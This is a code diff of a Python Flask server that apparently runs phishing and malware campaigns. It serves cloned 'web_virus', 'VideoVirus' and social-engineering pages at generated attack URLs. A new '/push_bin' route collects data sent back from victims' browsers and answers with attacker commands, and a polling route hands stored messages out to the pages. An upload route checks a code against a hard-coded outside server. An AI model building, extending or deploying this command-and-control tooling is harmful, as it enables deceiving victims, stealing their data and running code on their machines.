@@ -34,7 +34,7 @@ class user_sessen():
     username: str = ''
     url: str = ''
     attack_type: str = ''
-    message: str ='none'
+    message ='none'
     url_clone: str = ''
     attack_command: str = ''
 
@@ -142,6 +142,22 @@ def get_message(attack_url,message):
 
     else:
         return 'your message error'
+    
+@app.route('/push_bin/<attack_url>' , methods=['POST' , 'GET'])
+def push_bin(attack_url):
+    data = request.get_data()
+
+    if attack_url in url_list.keys():
+        if url_list.get(attack_url).attack_type == 'web_virus':
+            print("11: "+url_list.get(attack_url).attack_command)
+            url_list.get(attack_url).message = data
+            return url_list.get(attack_url).attack_command
+
+        url_list.get(attack_url).message = data
+        return 'ok'
+
+    else:
+        return 'your message error'
 
 @app.route('/get_virus_list')
 def get_virus_list():
@@ -164,10 +180,10 @@ def update_virus(filename , check):
             return 'Too many requests'
     else:
         visit_request[client_ip] = 1
-
+    message = json.loads(requests.get('http://154.201.85.154:11111/check_ip_check/' + check).text.strip())['message']
     if str(filename).strip().lower() == "index.html" or str(filename).strip().lower() == "index.htm":
         return 'FILE NAME IS NULL: index.html or index.htm'
-    if (json.loads(requests.get('http://154.201.85.154:11111/check_ip_check/' + check).text.strip())['message'] != 'ok'):
+    if message != 'ok':
         return 'Check code error.'
 
     current_time = time.time()  # 获取当前时间戳
@@ -186,11 +202,14 @@ def update_virus(filename , check):
 def xhr_run(attack_url):
     if attack_url in url_list.keys():
         u: user_sessen = url_list.get(attack_url)
-        # 返回u.message的值
-        message_to_return = u.message
-        # 更新u.message为'none'
-        u.message = 'none'
-        # 返回之前存储的消息
+        if u.attack_type == 'VideoVirus':
+            message_to_return = u.message
+        else:
+            # 返回u.message的值
+            message_to_return = u.message
+            # 更新u.message为'none'
+            u.message = 'none'
+            # 返回之前存储的消息
         return message_to_return
     else:
         return 'none'
@@ -297,6 +316,8 @@ def attack_url(attack_url):
         try:
             if u.attack_type == 'web_virus':
                 r.data = open('modules/web_virus/index.html').read()
+            if u.attack_type == 'VideoVirus':
+                r.data = open('modules/VideoVirus/index.html').read()
             else:
                 # print('modules/socialEngine/'+u.attack_type+"/index.html")
                 # print(open('modules/socialEngine/'+str(u.attack_type)+"/index.html").read())
